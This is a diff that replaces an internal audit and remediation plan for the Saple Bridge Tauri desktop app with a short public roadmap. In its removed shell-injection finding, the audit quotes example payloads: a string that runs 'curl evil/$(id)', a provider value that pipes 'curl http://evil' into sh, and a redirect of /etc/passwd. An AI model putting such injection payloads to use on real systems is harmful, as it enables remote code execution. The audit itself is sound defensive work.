@@ -1,400 +1,48 @@
-# Saple Bridge — Remediation & Completion Plan
+# Public Roadmap
 
-## Context
+This file tracks high-level Saple Bridge work that is useful to contributors and public readers. Internal audit notes, private handoff text, and machine-specific instructions should not be added here.
 
-A full integrity audit of `saple-bridge/` confirmed the app is structurally sound: it
-typechecks (`tsc --noEmit` → 0), compiles (`cargo check` → 0), and every `invoke()` maps to a
-registered Tauri command with matching arg names and serialized type shapes. No architectural
-breakage exists.
+## Status
 
-However the audit surfaced **16 findings** in four classes: (a) edge-case correctness bugs that
-cause silently wrong behavior, (b) credential/label UI disconnects, (c) half-built features
-(swarm handoffs, mailbox-write, unwired providers, inert buttons), and (d) defense-in-depth gaps.
-This plan fixes all of them and completes the half-built features, so the app's surface matches
-what actually works. Phases are ordered by risk: correctness first, then UX, then feature
-completion, then hardening and cleanup.
+Saple Bridge is a working local-first desktop app with:
 
----
+- Tauri desktop packaging.
+- React workspace UI.
+- Native PTY-backed terminals.
+- Kanban task state.
+- Markdown memory and wikilink graph support.
+- Swarm coordination state.
+- Review, staging, and commit tools.
+- OS keychain integration for provider credentials.
+- Bundled `saple-mcp` sidecar support.
 
-## Phase 1 — Critical correctness bugs (silently wrong behavior) — ✅ DONE
+## Short-Term Priorities
 
-> Completed 2026-06-26. Commits: `bbde96e` (1.1), `1b76c92` (1.2), `3fa06df` (1.3),
-> `83bf8a3` (1.4). Verified: `npm run typecheck` exit 0; `cargo test` 3/3 new git tests pass.
-> Note on 1.2: on this machine `git status --porcelain` v1 actually emits the rename as
-> `R  old -> new` (` -> `, not tab) — the existing parser already handled that case. The fix
-> still lands as planned: a `parse_rename_dest` helper treats ` -> ` as primary with a `\t`
-> fallback for robustness, plus unit tests.
+1. Keep release builds reproducible on Windows and macOS.
+2. Expand automated coverage for desktop flows that currently rely on manual smoke tests.
+3. Improve provider diagnostics and setup instructions.
+4. Document swarm templates, memory conventions, and review workflows in more depth.
+5. Add an updater and release signing flow once repository hosting and signing decisions are final.
 
-**1.1 Unify the approve/reject path.** ✅ `src/components/kanban/TaskDetailDrawer.tsx:72-111` flips
-the task column + session status directly and never records the decision, leaving
-`.saple/review/<taskId>.json` stuck at `"pending"`. Refactor both drawer buttons to call the same
-flow ReviewWorkspace uses: `useReviewStore.submitDecision(...)` (`src/stores/reviewStore.ts:122`)
-which invokes `submit_review_decision` and atomically updates record + task + session, then
-`loadTasks(force)`. Remove the duplicated TS-side mutation. Also replace the ad-hoc
-`Math.random().toString(36)` session id at `TaskDetailDrawer.tsx:133` with `createId('agent')`
-(`src/lib/id.ts`) for consistency with `TaskCard.tsx:43`.
+## Verification Standard
 
-**1.2 Fix staged-rename diff parsing.** ✅ `src-tauri/src/git.rs:83-91` parses renames with
-`find(" -> ")`, but `git status --porcelain` v1 emits `R  old\tnew` (tab-separated). Parse the
-porcelain rename format: split the XY-status path field on `\t` and take the destination path.
-Keep the ` -> ` fallback for safety. Add a unit test in `git.rs` covering a staged-rename
-porcelain line so the downstream `git_diff_file` call receives a clean path.
-
-**1.3 Clear editor content on new note.** ✅ Creating a blank note via `MemoryGraph.tsx:364-373` →
-`memoryStore.ts` `setActiveNote({ id: '', ... })` does not reset `activeNoteContent`, so the
-editor pre-fills with the previously open note's body. Update `setActiveNote` in
-`src/stores/memoryStore.ts` to reset `activeNoteContent` to `''` when the incoming node has no
-`filePath`/`id` (new-note case), or have `handleCreateNewNote` call a dedicated
-`startNewNote()` action that clears both `activeNote` and `activeNoteContent`.
-
-**1.4 Force swarm state re-read on project open.** ✅ `src/stores/swarmStore.ts:319`
-`loadSwarmState` short-circuits on `loadedProjectPath`, which is rehydrated from `localStorage`
-(zustand `persist`), so reopening a project skips reading `.saple/swarm/state.json` and discards
-external/MCP changes. Add a `force?: boolean` param mirroring `kanbanStore.loadTasks`
-(`src/stores/kanbanStore.ts:61`), and call `loadSwarmState(path, true)` from the project-open
-flow in `src/stores/projectStore.ts` (the same place Kanban/Memory are loaded).
-(Implemented: the project-open flow that loads Kanban/Swarm is actually the effect in
-`src/App.tsx:75-76`, not `projectStore.ts`; the `force=true` call was added there.)
-
----
-
-## Phase 2 — Credential & diagnostics UI disconnects — ✅ DONE
-
-> Completed 2026-06-26. Commits: `04278e1` (2.1 + 2.2), `ae39388` (2.3), `c6c84d7` (2.4).
-> Verified: `npm run typecheck` exit 0; `npm run build` OK; `cargo test` 25/25 pass (+2 new
-> wikilink tests). Notes: the Keychain tab was kept (not folded) and re-pointed at the shared
-> `saple_provider_codex_api_key` slot, with `refreshReadiness()` on save/delete so the Codex
-> card's badge updates. For 2.2, recommendation (a) was taken — a single "OS Keychain Backend"
-> row replaces the per-provider rows (frontend-only; the Rust `keychains` array is unchanged and
-> read at `[0]`). For 2.3, edge extraction was factored into a reusable `extract_wikilinks`
-> helper that also strips `|label` from targets, matching `remarkWikilinks.ts`.
-
-**2.1 Unify the OpenAI/Codex key slot.** ✅ `src/components/project/ProjectSettings.tsx:171-209`
-(Keychain tab) reads/writes service `'openai_api_key'`, while the Codex provider card (line 225)
-uses `saple_provider_codex_api_key`. Pick the `saple_provider_<provider>_api_key` convention
-(matches `keychain.rs` + CLAUDE.md spec) everywhere and route the Keychain tab through the same
-`providerStore` helpers the provider cards use, so a saved key reflects in both places. If the
-generic "Keychain" tab is redundant after this, fold it into the provider section.
-
-**2.2 Correct the diagnostics keychain labels.** ✅ The per-provider "X Keychain — Ready" rows
-(`ProjectSettings.tsx:988-997`) all render the single backend-probe result from
-`diagnostics.rs:131-139`, implying per-provider key presence. Either (a) relabel to "Keychain
-backend: Ready/Error" shown once, or (b) populate real per-provider presence using
-`has_api_key(saple_provider_<p>_api_key)` per provider. Recommended: (a) for the backend probe
-plus reuse the existing provider cards' "Key saved" badge for per-provider presence.
-
-**2.3 Resolve wikilinks via aliases + skip code in edge extraction.** ✅ Two divergences:
-- Preview `resolveTarget` (`src/components/memory/markdown/MemoryMarkdown.tsx:26-31`) resolves by
-  id/title only. Extend it to also match `node.aliases` (the Rust graph already does at
-  `memory.rs:342-344`), so `[[alias]]` renders as a resolved link.
-- Rust graph-edge extraction (`memory.rs:276-287`) does a raw `[[` scan that includes fenced/inline
-  code. Make it skip code spans/fences (mirror the AST approach of
-  `src/components/memory/markdown/remarkWikilinks.ts:63-76`) so code samples don't create spurious
-  edges. Add a unit test with a `[[x]]` inside a fenced block asserting no edge.
-
-**2.4 Fix hardcoded memory path display.** ✅ `src/components/memory/MemoryEditor.tsx:333` hardcodes
-`.saple/memory/`. Derive the prefix from the workspace `memoryMode` (`bridge-compatible` →
-`.bridgememory/`) available on `WorkspaceConfig` in `projectStore`. Display-only change.
-
----
-
-## Phase 3 — Complete the half-built features — ✅ DONE
-
-> Completed 2026-06-26. Verified: `npm run typecheck` exit 0; `npm run build` OK;
-> `cargo check` OK; `cargo test` 25/25 pass. Notes:
-> - The working tree already carried an in-flight `bridgecode → openrouter` provider rename
->   (the prerequisite 3.3 assumes — "openrouter has full Rust command-building + keychain
->   support"), a diagnostics provider-CLI/sign-in probe refactor, and a version bump. Per
->   decision these were committed together with the Phase-3 feature work.
-> - 3.1: handoff read/write actions added to `swarmStore`; `SwarmWorkspace` polls handoff
->   pairs (derived from the dependency graph's edges) on the *same* timer/ref as the mailbox
->   poll; `SwarmAgentCard` renders each resolved handoff JSON via `MarkdownPreview` (wrapped in
->   a fenced ```json block), split by in/out direction.
-> - 3.2: `writeMailbox` action + an operator compose box in the inspect panel that appends an
->   "Operator message" beneath existing mailbox content (never clobbers the agent's own writes).
-> - 3.3: `gemini`, `openrouter`, `cursor`, `copilot` added to `AI_PROVIDERS`; `openrouter`
->   given an explicit arm in the `pty.rs` provider-cleaning match.
-> - 3.4: restored `selectedProvider` state + a provider `<select>` in the empty-state "New
->   Pane"; `TerminalPane`'s branch button now passes `sessionInfo?.model` (was `undefined`).
-> - 3.5: "SHOW LESS" now toggles an expand/collapse of the provider picker (shows "SHOW MORE
->   (N)" when collapsed); "+ ADD CUSTOM COMMAND" launches a custom-command pane via
->   `addPane(..., customCommand)`, disabled until a command is typed.
-
-**3.1 Swarm handoffs (read + write UI).** ✅ `read_handoff_file` / `write_handoff_file`
-(`src-tauri/src/swarm.rs`, registered `lib.rs:89-90`) are never called from the frontend, yet
-agent prompts instruct agents to write handoffs. Wire end-to-end:
-- Add `readHandoff`/`writeHandoff` actions to `src/stores/swarmStore.ts` invoking the commands.
-- Surface handoff content in `src/components/swarm/SwarmWorkspace.tsx` / `SwarmAgentCard.tsx`
-  (poll alongside the existing mailbox polling at `SwarmWorkspace.tsx:93-148`, reusing that
-  interval/ref pattern rather than adding a second timer).
-- Render handoff markdown with the existing `MemoryMarkdown`/markdown viewer component.
-
-**3.2 Mailbox writing from the UI.** ✅ `write_mailbox_file` (`lib.rs:88`) is registered but the UI
-only reads. Add a `writeMailbox` action to `swarmStore.ts` and a compose/send affordance in
-`SwarmWorkspace.tsx` so the operator can post a message into an agent's mailbox (agents already
-read their mailbox via their own FS tools). Keep writes path-contained via the existing command.
-
-**3.3 Wire the missing terminal providers.** ✅ `gemini`, `openrouter`, `cursor`, `copilot` have
-full Rust command-building + keychain support but are absent from the wizard list
-(`src/components/terminal/TerminalGrid.tsx:18-25`). Add them to `AI_PROVIDERS` with correct
-metadata (reuse `src/components/swarm/wizard/providerMeta.ts` if it already encodes provider
-display/info). Also make `openrouter` an explicit arm in the Rust provider-cleaning match
-(`pty.rs:312-323`) for parity with the other providers rather than falling through `_`.
-
-**3.4 Fix terminal pane provider/model regressions.** ✅
-- `TerminalGrid.tsx:92` `selectedProvider` is frozen at `'codex'`; restore a working selector
-  (state + setter) so the empty-state "+ New Pane" honors the chosen provider.
-- Titlebar branch button `TerminalPane.tsx:838` passes `model: undefined` to `addPane`, dropping
-  the parent's model. Pass `sessionInfo?.model` so it matches `splitPane`'s inheritance
-  (`terminalStore.ts:556`).
-
-**3.5 Wire the inert buttons.** ✅ `TerminalGrid.tsx:524` ("SHOW LESS") and `:549` ("+ ADD CUSTOM
-COMMAND") render without handlers. Implement "SHOW LESS" to collapse the expanded provider list
-(inverse of the existing expand state) and "+ ADD CUSTOM COMMAND" to open the custom-command
-launch path that already exists in `terminalStore.addPane(..., customCommand)`.
-
----
-
-## Phase 4 — Security & defense-in-depth hardening — ✅ DONE
-
-> Completed 2026-06-26. Commit: `008427e`. Verified: `npm run typecheck` exit 0;
-> `npm run build` OK; `cargo test` 27/27 pass (+2 new memory-traversal tests). Notes:
-> - 4.2: containment is checked against each `dir.canonicalize()` per write-dir (memory mode can
->   resolve to multiple dirs), not a single base, so the check holds in `both`/`bridge-compatible`
->   modes too.
-> - 4.4: implemented part (a) — trust-boundary doc comments on `run_verification_command_inner`
->   (`review.rs`) and `handleRunVerification` (`ReviewWorkspace.tsx`). Part (b) (opt-in
->   confirmation) was deferred as a "consider"; the command stays operator-initiated and is shown
->   in the editable input before running.
-
-**4.1 Validate snapshot restore name.** ✅ `src-tauri/src/memory.rs` `restore_memory_snapshot_inner`
-accepted `name` raw. Applied the same `[a-zA-Z0-9\-_]` validation used by
-`create_memory_snapshot_inner` before building the path.
-
-**4.2 Contain memory file ops to the memory dir.** ✅ `delete_memory_file_inner` /
-`read_memory_file_inner` canonicalize-checked against the **project root**,
-allowing a crafted `filePath` to touch any project file. Changed the canonical base to the resolved
-memory dir (per write-dir `canonicalize()`). Added traversal unit tests mirroring the existing
-`project.rs` containment tests.
-
-**4.3 Atomic writes for config/user files.** ✅ Routed `install_mcp_config_inner`'s four writes
-and `write_text_file_inner` (`files.rs`) through the existing
-`crate::fs_lock::atomic_write` (`src-tauri/src/fs_lock.rs:36`) to avoid torn reads during
-concurrent access, matching how tasks/config are already written.
-
-**4.4 Constrain / acknowledge verification commands.** ✅ `run_verification_command`
-(`review.rs`) is unconstrained shell execution by design. Kept the capability and (a) documented
-the trust boundary in `review.rs` and the review UI. (b) opt-in confirmation deferred as a
-"consider". No allowlist (would break the dev-tool use case); this is a documented, contained risk.
-
-**4.5 Path-validate `check_mcp_status`.** ✅ `check_mcp_status_inner` built the path with bare
-`Path::new(&project_path).join(...)`. Routed through `get_project_file_path` for consistency with
-the rest of the module (read-only, low impact, consistency fix).
-
----
-
-## Phase 5 — Dead code & consistency cleanup — ✅ DONE
-
-> Completed 2026-06-26. Verified: `npm run typecheck` exit 0; `cargo check` clean (no warnings);
-> `cargo test` 27/27 pass. Notes:
-> - `git_diff_summary` had no caller after Phase 1, so beyond dropping the Tauri wrapper its
->   now-orphaned `git_diff_summary_inner` helper **and** the `GitDiffSummary` struct were also
->   removed (review.rs only uses `git_status_inner`, which is kept). `git_status` likewise: only
->   the wrapper was removed; `git_status_inner` stays.
-> - The `McpStatus`/`McpConfigStatus` distinction was documented (doc comments cross-referencing
->   each other) rather than renamed — they live in different modules and `McpStatus` carries an
->   extra `other_servers` field for the Settings UI, so they are genuinely distinct types.
-
-- **Remove orphaned `src/types/review.ts`** — ✅ superseded by the inline type in `reviewStore.ts`,
-  imported nowhere, and had a field-name mismatch (`decision` vs `status`) that would mislead future
-  edits.
-- **Remove unused command wrappers** — ✅ `get_app_binary_path` (`lib.rs`) and the standalone
-  `git_status` / `git_diff_summary` Tauri wrappers were dropped from the `invoke_handler` list and
-  deleted (no frontend caller). `git_status_inner` is kept (review uses it internally);
-  `git_diff_summary_inner` + `GitDiffSummary` were removed as genuinely dead.
-- **Reconcile `McpStatus` vs `McpConfigStatus`** (`project.rs` / `diagnostics.rs`) — ✅ documented
-  the distinction with cross-referencing doc comments.
-
----
-
-## Phase 6 — Verification — ✅ DONE
-
-> Completed 2026-06-26. Full automated verification re-run at the end of the plan, all green:
-> - `npm run typecheck` → exit 0
-> - `npm run build` (tsc + vite) → built in 3.58s, no errors
-> - `cargo check --manifest-path src-tauri/Cargo.toml` → finished clean (no warnings)
-> - `cd src-tauri; cargo test` → **27 passed; 0 failed** (incl. git-rename, wikilink/code-skip,
->   snapshot-name, and memory-traversal containment tests added across Phases 1–4)
->
-> The end-to-end manual checks below require an interactive desktop session (`npm run tauri dev`)
-> and remain operator-driven — they are not runnable headless from CI/agent. Listed here as the
-> smoke matrix for a human pass before release.
-
-Run after each phase and again at the end:
+For normal code changes, run the checks that match the changed surface area:
 
 ```powershell
-# Frontend
-npm run typecheck            # must stay exit 0
-npm run build                # tsc + vite
-
-# Rust
+npm run typecheck
+npm test
+npm run build
 cargo check --manifest-path src-tauri/Cargo.toml
-cd src-tauri; cargo test     # exercises new git-rename, wikilink, snapshot, containment tests
+cd src-tauri
+cargo test
 ```
 
-End-to-end manual checks (per the README smoke matrix):
-- **Review:** approve a task from `TaskDetailDrawer`; confirm `.saple/review/<id>.json` flips to
-  `approved` and the card moves columns (Phase 1.1). Stage a file rename; confirm its diff loads
-  (Phase 1.2).
-- **Memory:** create a new note from the graph and confirm the editor is empty (1.3). Add an alias,
-  reference it as `[[alias]]`, confirm it resolves in preview (2.3). Put `[[x]]` in a fenced code
-  block, confirm no graph edge appears (2.3).
-- **Swarm:** open a project with existing `.saple/swarm/state.json` from a fresh app start; confirm
-  disk state loads, not stale localStorage (1.4). Trigger a handoff/mailbox write from an agent and
-  confirm it surfaces in the UI (3.1, 3.2).
-- **Keychain:** save an OpenAI/Codex key; confirm it shows saved in both the Keychain tab and the
-  Codex card (2.1).
-- **Diagnostics:** run diagnostics; confirm keychain label reads as backend status, and provider
-  CLI/signin reflect reality (2.2).
-- **Terminals:** launch each newly wired provider from the wizard; confirm correct command + model
-  inheritance on branch (3.3, 3.4); confirm SHOW LESS / ADD CUSTOM COMMAND work (3.5).
-- **MCP:** re-run "Test MCP tools" in settings; confirm 18 tools still list and the server still
-  starts via `["mcp", <path>]` after the atomic-write change (4.3).
+For release candidates, also run the manual smoke test in `smoke-test-workspace/` and install the generated bundle on the target platform.
 
-## Suggested commits (conventional, focused)
+## Documentation Standard
 
-`fix:` per Phase-1 item · `fix:` per Phase-2 item · `feat:` for 3.1–3.5 · `fix:`/`refactor:` for
-Phase 4 · `chore:`/`refactor:` for Phase 5. Verify locally before pushing per CLAUDE.md.
-
----
-
-## Phase 7 — Full-scan findings (2026-06-26) — ✅ DONE
-
-> Completed 2026-07-02. All 16 findings fixed across commits db45f32 (7.1), af2b1d2 (7.2),
-> 9833d0e (7.3), 3f21c11 (7.4), 8f36ddd (7.5/7.6), cd87d44 (7.7), 4615a34 (7.8/7.12-7.14),
-> 9944436 (7.9-7.11/7.16), 889372f (7.15). Verified: typecheck exit 0, build OK,
-> cargo test 30/30 pass (+5 new injection/traversal tests).
-
-> Source: full project scan via 4 parallel audits (Rust backend, React stores, React components,
-> build/config). Baseline at scan time: `tsc --noEmit` exit 0 and `cargo check` clean — these are
-> **logic / security / concurrency** defects, not build breaks.
-> Tags: ✅ = verified by reading source during the scan · ⚠️ = audit-reported, mechanism plausible,
-> not independently line-traced. Fix the three verified criticals (7.1–7.3) first.
-
-### Critical
-
-**7.1 Shell injection across the renderer→Rust boundary in `pty.rs`.** ✅ `src-tauri/src/pty.rs:313–361`.
-Three frontend-controlled inputs are interpolated **unescaped** into a shell string run via
-`powershell -Command` / `bash -lc`:
-- `model_str` (336/338/341) — a `"` breaks out: `model = 'x"; curl evil/$(id); echo "'` → RCE.
-- `provider` passthrough (323) — `_ => provider` runs an arbitrary provider name verbatim as the
-  shell command (`ai_provider = "curl http://evil | sh"`).
-- `prompt_file` (338/348) — interpolated into `< "{}"` with no escaping and **no project
-  containment** (can redirect e.g. `/etc/passwd` into a provider CLI).
-
-Fix: drop the `_ => provider` fallthrough (allowlist providers only); pass `--model` / prompt file
-as `CommandBuilder` args instead of shell-interpolating; run `prompt_file` through the same
-project-containment check used elsewhere. Contradicts the CLAUDE.md "Rust is the path-contained
-trust boundary" rule, so this is in scope despite the renderer being app code.
-
-**7.2 Keychain accepts arbitrary `service` names.** ✅ `src-tauri/src/keychain.rs:5–14, 48–63`.
-`set_api_key` / `delete_api_key` pass `service` straight to `Entry::new(&service, …)` with no
-validation; the `saple_provider_<provider>_api_key` contract is not enforced. (Account is pinned to
-`saple_bridge_user`, so this can't reach *other apps'* OS secrets — defense-in-depth, not full
-takeover.) Fix: reject `service` not matching `^saple_provider_[a-z0-9_]+_api_key$`.
-
-**7.3 Within-project path traversal in `save_memory_node_inner`.** ✅ `src-tauri/src/memory.rs:646–728`.
-`clean_category`/`clean_id` only `.replace(' ', "-")` — they do **not** strip `/` or `..`, so
-`category = "a/../../.saple"` resolves back inside the project and passes the containment check,
-which compares against the **project root** (not the memory dir). Also `fs::create_dir_all(parent)`
-(722) runs **before** the check (725). Note: Phase 4.2 already fixed this for the *delete/read*
-paths but left the *save* path on the project-root base. Fix: reject `/`, `\`, `..` in category/id;
-canonicalize against the memory dir, mirroring 4.2.
-
-**7.4 Swarm can double-launch / leak agents.** ⚠️ `src/stores/swarmStore.ts`.
-- `checkAndRunNextAgents` (≈491–579) snapshots `activeAgents` then `await`s a save + recursive
-  call; a concurrent PTY-output `updateAgentStatus` re-enters with the same snapshot and launches
-  the same agent's PTY + prompt file twice (second terminal untracked).
-- `stopSwarm` (≈471–489) keeps `status:'running'` during the sequential `await removePane`
-  teardown, so a concurrent `[AGENT_DONE]` launches a new agent mid-shutdown, outside the kill list.
-
-Fix: re-entry guard / `launching` flag; set `swarmActive=false` **before** the teardown loop.
-
-### High
-
-**7.5 `agentSessionStore.saveSessions` bypasses write serialization.** ⚠️ `src/stores/agentSessionStore.ts:61–70`
-calls `invoke('write_project_file')` directly instead of the `enqueueWrite` queue kanban/swarm use;
-overlapping saves can reorder so a stale snapshot wins. Route through `enqueueWrite`.
-
-**7.6 Non-atomic writes to state files.** ✅ (inconsistency confirmed) `review.rs:85,157,202,219,243`
-and `project.rs:241` use bare `fs::write` for `tasks.json` / `sessions.json` / review records /
-initial config while the rest of the codebase uses `fs_lock::atomic_write`. A crash mid-write
-corrupts the file. Route them through `atomic_write` (extends the Phase 4.3 pass, which missed these).
-
-**7.7 Duplicate PTY id leaks a process + 3 threads.** ✅ `src-tauri/src/pty.rs:473` —
-`.insert(id, …)` overwrites an existing session without killing its child or reader/emitter/writer
-threads; `kill_pty(id)` then only reaps the survivor. Reject or kill-then-replace on duplicate id.
-
-**7.8 Production CSP ships dev-server origins.** ✅ `src-tauri/tauri.conf.json:23` `connect-src`
-includes `ws://localhost:1420` and `http://localhost:1420` (Vite devUrl) with no dev/prod split.
-Low blast radius (localhost connect-src only) but should be stripped from the release bundle via a
-`tauri.dev.conf.json` override.
-
-### Medium
-
-**7.9 Stale-write races on rapid interaction.** ⚠️ `memoryStore.ts:86–123` (`loadNote`) and
-`providerStore.ts:63–88` (`refreshReadiness`) have no request-currency guard, so an older async
-response can overwrite a newer one. Add a request-id / `activeNote` currency check before `set`.
-
-**7.10 Swarm `persist` has no `partialize`.** ⚠️ `src/stores/swarmStore.ts` persists full state
-(long system prompts, all templates) to localStorage; growth risks an uncaught `QuotaExceededError`
-that silently breaks persistence. Add `partialize` to persist only what's needed.
-
-**7.11 `terminalStore.outputListeners` not cleared in `removePane`.** ⚠️ `src/stores/terminalStore.ts:113,
-~641` deletes every per-pane map except `outputListeners`; on an error-boundary unmount (cleanup
-not run) the listener Set leaks. Delete the pane's `outputListeners` entry in `removePane`.
-
-### Low
-
-**7.12 Version drift.** ✅ `package.json` & `src-tauri/tauri.conf.json` = `1.0.6`, but
-`src-tauri/Cargo.toml:3` = `1.0.0`; `scripts/tauri.mjs:41–49` bumps the first two and never touches
-Cargo.toml. Add Cargo.toml to the bump loop; also replace scaffold metadata
-(`description = "A Tauri App"`, `authors = ["you"]`).
-
-**7.13 Build-script target handling.** ✅ `scripts/prepare-sidecar.mjs:24` only matches
-`--target=<triple>`; the space form `--target <triple>` silently falls back to host triple.
-`scripts/tauri.mjs:57` hardcodes `target/release/bundle`, wrong for cross-compiled `--target`
-builds. Parse both arg forms and compute `bundleDir` from the triple.
-
-**7.14 Committed build artifacts.** ✅ `vite.config.js` / `vite.config.d.ts` are emitted outputs in
-the repo root, not gitignored; `tsconfig.node.json` lacks `noEmit`. Add `noEmit`, gitignore the
-outputs.
-
-**7.15 React index-keys & effect-dep nits.** ⚠️ `SwarmGraph.tsx:167` uses `key={idx}` on edges
-(wrong stroke animations on reorder — use `${conn.from}-${conn.to}`); `ReviewWorkspace.tsx`
-recomputes `activeTask` each render inside effect deps, resetting reviewer state on background poll;
-`CommandPalette.tsx:118` uses a 100 ms `setTimeout` + `querySelector` to click a lazily-loaded tab
-(silent no-op on slow load — pass an initial-tab prop instead).
-
-**7.16 Unbounded growth.** ⚠️ `fs_lock.rs:24` lock map never pruned (also keyed on non-canonical
-path, so two spellings of one file get separate locks); `notificationStore` array uncapped;
-covered partly by 7.11. Cap/prune where they grow without bound.
-
-### Phase 7 verification (run after fixes)
-
-```powershell
-npm run typecheck            # exit 0
-npm run build                # tsc + vite
-cargo check --manifest-path src-tauri/Cargo.toml
-cd src-tauri; cargo test     # add traversal tests for 7.3 (mirror Phase 4.2)
-```
-
-Manual: confirm a non-allowlisted provider / a `"`-bearing model no longer reaches the shell (7.1);
-`set_api_key` with a non-`saple_provider_*` service is rejected (7.2); `save_memory_node` with
-`category` containing `..`/`/` is rejected (7.3); launching two swarm agents back-to-back spawns
-exactly one PTY each (7.4).
-
-### Suggested commits
-
-`fix:` per 7.1–7.3 (security, one focused commit each) · `fix:` 7.4–7.7 (concurrency/leaks) ·
-`fix:` 7.8 (CSP) · `fix:` 7.9–7.11 · `chore:`/`fix:` 7.12–7.16. Verify locally before pushing.
+- Keep public docs accurate and reproducible.
+- Do not include secrets, personal access tokens, private issue links, or machine-specific absolute paths.
+- Prefer commands that exist in `package.json`.
+- If a workflow depends on the sibling `../saple-mcp` repository, state that dependency clearly.
+- Keep old implementation notes out of the README; move lasting decisions into dedicated docs when needed.
